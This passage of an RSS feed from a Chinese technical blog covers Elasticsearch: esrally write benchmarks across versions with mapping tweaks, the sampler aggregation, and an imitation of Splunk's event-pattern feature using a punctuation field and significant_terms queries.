&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/opt/local/Library/Frameworks/Python.framework/Versions/3.5/bin/esrally --offline --pipeline=from-distribution --distribution-version=1.7.3 --track=geonames
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;静静等待程序运行完毕，就会给出一个漂亮的输出结果了。&lt;/p&gt;
&lt;p&gt;这个运行会是一个很漫长的时间，如果你其实只关心部分的性能，比如只关心写入，不关心搜索。其实可以自己去修改一下 track 的任务定义。&lt;/p&gt;
&lt;p&gt;track 的定义文件在 &lt;code class=&quot;highlighter-rouge&quot;&gt;~/.rally/benchmarks/tracks/default/geonames/track.json&lt;/code&gt;。如果你改动较大，建议直接新建一个 track 目录，比如叫 &lt;code class=&quot;highlighter-rouge&quot;&gt;mytest/track.json&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;对照 geonames 里的定义，有各种 operations，然后在 challenges 里指明调用哪些 operation。最后运行命令的时候通过 &lt;code class=&quot;highlighter-rouge&quot;&gt;--challenge=&lt;/code&gt; 参数来指定执行哪个。&lt;/p&gt;
&lt;p&gt;下面是一段我在本机采用默认压测数据集 geonames 的结果：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;version&lt;/th&gt;
      &lt;th&gt;eps&lt;/th&gt;
      &lt;th&gt;index size&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;1.7.3&lt;/td&gt;
      &lt;td&gt;12650&lt;/td&gt;
      &lt;td&gt;2.67GB&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2.3.2&lt;/td&gt;
      &lt;td&gt;10344&lt;/td&gt;
      &lt;td&gt;3.31GB&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5.0.0-alpha2&lt;/td&gt;
      &lt;td&gt;11903&lt;/td&gt;
      &lt;td&gt;3.19GB&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;差距好大啊？！然后我发现 1.7.3 用的 mapping 没加 doc_values，修改 &lt;code class=&quot;highlighter-rouge&quot;&gt;~/.rally/benchmarks/tracks/default/geonames/mappings.json&lt;/code&gt; ，都加上后重新测试结果：&lt;/p&gt;
&lt;p&gt;10448eps 3.25GB&lt;/p&gt;
&lt;p&gt;接着再关闭 &lt;code class=&quot;highlighter-rouge&quot;&gt;_all&lt;/code&gt; 结果：&lt;/p&gt;
&lt;p&gt;12630eps 2.73GB&lt;/p&gt;
&lt;p&gt;接着再关闭&lt;code class=&quot;highlighter-rouge&quot;&gt;_field_names&lt;/code&gt; 结果：&lt;/p&gt;
&lt;p&gt;14662eps 2.71GB&lt;/p&gt;
&lt;p&gt;以及打开&lt;code class=&quot;highlighter-rouge&quot;&gt;_field_names&lt;/code&gt; 关闭 &lt;code class=&quot;highlighter-rouge&quot;&gt;_source&lt;/code&gt; 结果：&lt;/p&gt;
&lt;p&gt;13121eps 2.04GB&lt;/p&gt;
&lt;p&gt;在关闭&lt;code class=&quot;highlighter-rouge&quot;&gt;_all&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;_field_names&lt;/code&gt;的基础上，mapping中分词字符串字段加上&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;index_options&quot;: &quot;docs&quot;,
&quot;norms&quot;: {
    &quot;enabled&quot;: false
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;定义的结果：&lt;/p&gt;
&lt;p&gt;16226eps 2.6GB&lt;/p&gt;
&lt;p&gt;写入速度大概提高了10%。&lt;/p&gt;
&lt;p&gt;如果要用自己的数据集呢，也一样是在自己的 track.json 里定义，比如：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-JSON&quot;&gt;{
    &quot;meta&quot;: {
        &quot;data-url&quot;: &quot;/Users/raochenlin/.rally/benchmarks/data/splunklog/1468766825_10.json.bz2&quot;
    },
    &quot;indices&quot;: [
        {
            &quot;name&quot;: &quot;geonames&quot;,
            &quot;types&quot;: [
                {
                     &quot;name&quot;: &quot;type&quot;,
                     &quot;mapping&quot;: &quot;mappings.json&quot;,
                     &quot;documents&quot;: &quot;1468766825_10.json.bz2&quot;,
                     &quot;document-count&quot;:  924645,
                     &quot;compressed-bytes&quot;: 19149532,
                     &quot;uncompressed-bytes&quot;: 938012996
                }
            ]
        }
    ],
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里就是用的一份 splunkd 的 internal 日志，JSON 导出。日志原长度为 166152239，导出 JSON 长度为 938012996。&lt;/p&gt;
&lt;p&gt;同样做一次写入压测，结果为：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;关闭&lt;code class=&quot;highlighter-rouge&quot;&gt;_field_names&lt;/code&gt;：7193.5eps，索引大小358.173MB。&lt;/li&gt;
  &lt;li&gt;关闭&lt;code class=&quot;highlighter-rouge&quot;&gt;_field_names&lt;/code&gt;和norms：8216.5eps，345.536MB。&lt;/li&gt;
  &lt;li&gt;关闭&lt;code class=&quot;highlighter-rouge&quot;&gt;_source&lt;/code&gt;和norms：6615eps，192.817MB。&lt;/li&gt;
&lt;/ul&gt;
    &lt;hr&gt;
    
    &lt;hr&gt;
  &lt;!-- JiaThis Button BEGIN --&gt;
&lt;div class=&quot;jiathis_style&quot;&gt;
&lt;span class=&quot;jiathis_txt&quot;&gt;分享到：&lt;/span&gt;
&lt;a class=&quot;jiathis_button_tsina&quot;&gt;新浪微博&lt;/a&gt;
&lt;a class=&quot;jiathis_button_weixin&quot;&gt;微信&lt;/a&gt;
&lt;a class=&quot;jiathis_button_renren&quot;&gt;人人网&lt;/a&gt;
&lt;a class=&quot;jiathis_button_ydnote&quot;&gt;有道云笔记&lt;/a&gt;
&lt;a class=&quot;jiathis_button_gmail&quot;&gt;Gmail邮箱&lt;/a&gt;
&lt;a class=&quot;jiathis_button_twitter&quot;&gt;Twitter&lt;/a&gt;
&lt;a class=&quot;jiathis_button_googleplus&quot;&gt;Google+&lt;/a&gt;
&lt;a class=&quot;jiathis_button_hi&quot;&gt;百度空间&lt;/a&gt;
&lt;a class=&quot;jiathis_button_fb&quot;&gt;Facebook&lt;/a&gt;
&lt;a class=&quot;jiathis_button_douban&quot;&gt;豆瓣&lt;/a&gt;
&lt;a href=&quot;http://www.jiathis.com/share?uid=1589850&quot; class=&quot;jiathis jiathis_txt jiathis_separator jtico jtico_jiathis&quot; target=&quot;_blank&quot;&gt;更多&lt;/a&gt;
&lt;a class=&quot;jiathis_counter_style&quot;&gt;&lt;/a&gt;
&lt;/div&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
var jiathis_config={
	data_track_clickback:true,
	summary:&quot;&quot;,
	ralateuid:{
		&quot;tsina&quot;:&quot;1035836154&quot;
	},
	shortUrl:false,
	hideMore:false
}
&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;http://v3.jiathis.com/code/jia.js?uid=1589850&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt;
&lt;!-- JiaThis Button END --&gt;
&lt;!-- UY BEGIN --&gt;


&lt;!-- UY END --&gt;
  &lt;/div&gt;

</description>
        <pubDate>Fri, 19 Aug 2016 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2016/2016-08-19-es-rally-075a4ef4e.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2016/2016-08-19-es-rally-075a4ef4e.html</guid>
        
        
        <category>chenlinux</category>
        
      </item>
    
      <item>
        <title>elasticsearch 的 sampler 聚合</title>
        <description>

  
  &lt;div style=&quot;background-color: #FFF;&quot;&gt;
    &lt;p&gt;在上一篇文章的基础上，其实 Elasticsearch 从 2.0 以后，还新增了另一种聚合方式，叫 sampler。这个聚合的作用，是在每个分片上，只采样部分文档出来继续后续统计。&lt;/p&gt;
&lt;p&gt;比如把上一篇的查询改成这样：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
curl -XPOST &lt;span class=&quot;s1&quot;&gt;&#39;localhost:9200/logstash-2016.07.18/logs/_search?pretty&amp;amp;terminate_after=10000&amp;amp;size=0&#39;&lt;/span&gt; -d &lt;span class=&quot;s1&quot;&gt;&#39;
{
    &quot;aggs&quot;: {
        &quot;group&quot;: {
            &quot;terms&quot;: {
                &quot;field&quot;: &quot;result.punct&quot;
            },
            &quot;aggs&quot;: {
                &quot;sample&quot;: {
                    &quot;sampler&quot;: {
                         &quot;shard_size&quot;: 200
                     },
                    &quot;aggs&quot;: {
                        &quot;keyword&quot;: {
                            &quot;significant_terms&quot;: {
                                &quot;size&quot;: 1,
                                &quot;field&quot;: &quot;result._raw&quot;
                            },
                            &quot;aggs&quot;: {
                                &quot;hit&quot;: {
                                    &quot;top_hits&quot;: {
                                        &quot;_source&quot;: {
                                            &quot;include&quot;: [ &quot;result._raw&quot; ]
                                        },
                                        &quot;size&quot;:1
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
&#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;当然，在这个 raw 日志的情况下，取样意义不是特别到，因为有 &lt;code class=&quot;highlighter-rouge&quot;&gt;terminate_after&lt;/code&gt; 在，采样本身不会绝对随机。但是对其他 &lt;code class=&quot;highlighter-rouge&quot;&gt;doc_values&lt;/code&gt; 的字段，采样就有意义了。&lt;/p&gt;
    &lt;hr&gt;
    
    &lt;hr&gt;
  &lt;!-- JiaThis Button BEGIN --&gt;
&lt;div class=&quot;jiathis_style&quot;&gt;
&lt;span class=&quot;jiathis_txt&quot;&gt;分享到：&lt;/span&gt;
&lt;a class=&quot;jiathis_button_tsina&quot;&gt;新浪微博&lt;/a&gt;
&lt;a class=&quot;jiathis_button_weixin&quot;&gt;微信&lt;/a&gt;
&lt;a class=&quot;jiathis_button_renren&quot;&gt;人人网&lt;/a&gt;
&lt;a class=&quot;jiathis_button_ydnote&quot;&gt;有道云笔记&lt;/a&gt;
&lt;a class=&quot;jiathis_button_gmail&quot;&gt;Gmail邮箱&lt;/a&gt;
&lt;a class=&quot;jiathis_button_twitter&quot;&gt;Twitter&lt;/a&gt;
&lt;a class=&quot;jiathis_button_googleplus&quot;&gt;Google+&lt;/a&gt;
&lt;a class=&quot;jiathis_button_hi&quot;&gt;百度空间&lt;/a&gt;
&lt;a class=&quot;jiathis_button_fb&quot;&gt;Facebook&lt;/a&gt;
&lt;a class=&quot;jiathis_button_douban&quot;&gt;豆瓣&lt;/a&gt;
&lt;a href=&quot;http://www.jiathis.com/share?uid=1589850&quot; class=&quot;jiathis jiathis_txt jiathis_separator jtico jtico_jiathis&quot; target=&quot;_blank&quot;&gt;更多&lt;/a&gt;
&lt;a class=&quot;jiathis_counter_style&quot;&gt;&lt;/a&gt;
&lt;/div&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
var jiathis_config={
	data_track_clickback:true,
	summary:&quot;&quot;,
	ralateuid:{
		&quot;tsina&quot;:&quot;1035836154&quot;
	},
	shortUrl:false,
	hideMore:false
}
&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;http://v3.jiathis.com/code/jia.js?uid=1589850&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt;
&lt;!-- JiaThis Button END --&gt;
&lt;!-- UY BEGIN --&gt;


&lt;!-- UY END --&gt;
  &lt;/div&gt;

</description>
        <pubDate>Thu, 21 Jul 2016 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2016/2016-07-21-sampler-aggregation-e0d218492.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2016/2016-07-21-sampler-aggregation-e0d218492.html</guid>
        
        
        <category>chenlinux</category>
        
      </item>
    
      <item>
        <title>山寨一个 Splunk 的事件模式功能</title>
        <description>

  
  &lt;div style=&quot;background-color: #FFF;&quot;&gt;
    &lt;p&gt;之前我曾经讲过一个简单的在 ELK 中山寨 Splunk 的『显示来源』功能的办法。这次我们玩个更有难度的、当然依然只是山寨式功能的新东西：『事件模式』功能。&lt;/p&gt;
&lt;p&gt;Splunk 6.2 推出的这个功能，会基于当前搜索语句的结果集做模式探测，根据精度调整，做成不同数量的聚类。然后给每个聚类分组内，提取出一个关键词（个别情况下也有零个或多个的）。也就是通过机器学习的手段，探测你的日志可能有什么模式，其最具识别性的关键内容是什么。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/chenlinux.com/263a1208c8b32d4950970b418776ac9f.jpg&quot; alt=&quot;Event Pattern&quot;&gt;&lt;/p&gt;
&lt;p&gt;这个页面如果用 SPL 表示，就是：&lt;code class=&quot;highlighter-rouge&quot;&gt;index=_internal | cluster t=0.8 lableonly=true | findkeywords labelfield=cluster_label | sort - percentInputGroup&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/chenlinux.com/0d6b9ab183c5e4646d05b54283325ad8.jpg&quot; alt=&quot;findkeywords command&quot;&gt;&lt;/p&gt;
&lt;p&gt;我们目前当然在 ES 里是没法做聚类分析什么的了。不过在日志场景下，也不是没有近似的办法。&lt;/p&gt;
&lt;h3 id=&quot;section&quot;&gt;第一步：完成山寨版的日志模式分组&lt;/h3&gt;
&lt;p&gt;其实如何山寨模式分组，Splunk 也有类似 SPL 命令做出了示范。这个命令叫 &lt;code class=&quot;highlighter-rouge&quot;&gt;typelearner&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;这个命令的大致意思是：把日志里的英文单词、数字、空格等字符都隐藏掉，剩下各种标点符号，就代表一种日志类型。简单的处理方式就是：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cat samplelog.cisco.asa |sed &lt;span class=&quot;s1&quot;&gt;&#39;s/[0-9a-zA-Z]*//g&#39;&lt;/span&gt; | sed &lt;span class=&quot;s1&quot;&gt;&#39;s/[[:space:]]/_/g&#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;然后将这个纯标点符号的字符串，存为事件的一个字段，我们沿袭 Splunk 的叫法： &lt;strong&gt;punct&lt;/strong&gt; 。&lt;/p&gt;
&lt;p&gt;这样，我们只要简单的对 punct 字段做 &lt;code class=&quot;highlighter-rouge&quot;&gt;terms aggregation&lt;/code&gt; 就可以获取模式分组了。&lt;/p&gt;
&lt;h3 id=&quot;section-1&quot;&gt;第二步：完成分组内的关键词查找&lt;/h3&gt;
&lt;p&gt;然后查找关键词。什么叫关键词呢？就是要能让本分组跟其他分组有显著差异的一个词。这个显然不能再用 terms aggregation 了。否则出来的是最多的词，而不是最有差异性的词。ES 对这个也提供了现成的聚合方式：&lt;code class=&quot;highlighter-rouge&quot;&gt;significant_terms aggregation&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;然后这里有另一个问题：一般我们都是在 &lt;code class=&quot;highlighter-rouge&quot;&gt;not_analyzed&lt;/code&gt; 字段上做聚合统计的。现在显然并没有具体哪个字段来提供单个字段值做聚合！我们需要用的就是&lt;strong&gt;分词的日志原文内容&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;所以这块我们需要对原文字段的 mapping 做出特殊定义：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;message&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;text&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;fielddata&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;index_options&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;docs&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;norms&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;即重新放开 fielddata —— ES 5.0 里，text 类型字段已经默认关闭 fielddata 了。&lt;/p&gt;
&lt;p&gt;至于内存的问题，或者交给 Circuit Breaker 来控制；或者自己通过请求中的 &lt;code class=&quot;highlighter-rouge&quot;&gt;terminate_after&lt;/code&gt; 参数预先控制。&lt;/p&gt;
&lt;p&gt;就模式发现这个功能来说，通过 &lt;code class=&quot;highlighter-rouge&quot;&gt;terminate_after&lt;/code&gt; 参数预定义控制应该是个不错的思路。因为本来就是一个不确定的猜测，加太大的数据量来做这事儿，没多少性价比。&lt;/p&gt;
&lt;p&gt;所以我们最终发出的请求是这样：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
curl -XPOST &lt;span class=&quot;s1&quot;&gt;&#39;http://localhost:9200/logstash-2016.07.18/logs/_search?pretty&amp;amp;terminate_after=30000&amp;amp;size=0&#39;&lt;/span&gt; -d &lt;span class=&quot;s1&quot;&gt;&#39;
{
    &quot;aggs&quot;: {
        &quot;group&quot;: {
            &quot;terms&quot;: {
                &quot;field&quot;: &quot;punct&quot;
            },
            &quot;aggs&quot;: {
                &quot;keyword&quot;: {
                    &quot;significant_terms&quot;: {
                        &quot;size&quot;: 1,
                        &quot;field&quot;: &quot;message&quot;
                    },
                    &quot;aggs&quot;: {
                        &quot;hit&quot;: {
                            &quot;top_hits&quot;: {
                                &quot;_source&quot;: {
                                    &quot;include&quot;: [ &quot;message&quot;  ]
                                },
                                &quot;size&quot;:1
                            }
                        }
                    }
                }
            }
        }
    }
}
&#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;我们可以看到请求结果如下：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;took&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2179&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;timed_out&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;terminated_early&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_shards&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;total&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;successful&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;failed&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;failures&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;shard&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;index&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;logstash-2016.07.18&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;node&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;L0qQ1ZcyQGmj7Ge7ZlCmYg&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;reason&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;circuit_breaking_exception&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;reason&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;[request] Data too large, data for [&amp;lt;reused_arrays&amp;gt;] would be larger than limit of [415550668/396.2mb]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;bytes_wanted&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;415762160&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;bytes_limit&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;415550668&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;hits&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;total&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;371095&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;max_score&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;hits&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
